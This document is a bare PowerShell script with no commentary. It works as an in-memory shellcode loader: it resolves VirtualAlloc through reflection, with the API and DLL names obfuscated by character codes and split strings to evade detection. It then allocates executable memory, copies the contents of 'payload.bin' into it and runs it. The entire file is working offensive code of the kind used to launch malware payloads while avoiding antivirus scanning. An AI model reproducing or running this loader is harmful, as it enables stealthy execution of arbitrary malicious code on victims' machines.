###

Set-StrictMode -Version 2

function func_get_proc_address_new_b {
    $var_unsafe_native_methods = [AppDomain]::CurrentDomain.GetAssemblies()
    $var_unsafe_native_methods_news = ($var_unsafe_native_methods  | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('Syst'+'em.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $var_gpa = $var_unsafe_native_methods_news.GetMethod('GetProc'+'Address', [Type[]] @('Runtime.InteropServices.HandleRef', 'string'))
    return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods_news.GetMethod('GetModuleHandle')).Invoke($null, @([char]107+[char]101+[char]114+[char]110+[char]101+[char]108+"32.d"+[char]108+[char]108)))), ("Virtua"+[char]108+"A"+[char]108+[char]108+"oc")))
}

function func_get_delegate_type_new_a {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $parameters,
        [Parameter(Position = 1)] [Type] $var_return_type = [Void]
    )
    $var_builder_new = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
    $var_builder_new.DefineConstructor('RTSpec'+'ialName, HideB'+'ySig, Public', [Reflection.CallingConventions]::Standard, $parameters).SetImplementationFlags('Runtime, Managed')
    $var_builder_new.DefineMethod('Inv'+'oke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $parameters).SetImplementationFlags('Runtime, Managed')
    return $var_builder_new.CreateType()
}

If ([IntPtr]::size -eq 8) {
    [Byte[]]$acode = [System.IO.File]::ReadAllBytes('payload.bin')
    $var_va = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address_new_b), (func_get_delegate_type_new_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
    $var_buffer = $var_va.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)
    [Runtime.InteropServices.Marshal]::Copy($acode, 0, $var_buffer, $acode.length)
    $var_runme = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type_new_a @([IntPtr]) ([Void])))
    $var_runme.Invoke([IntPtr]::Zero)
}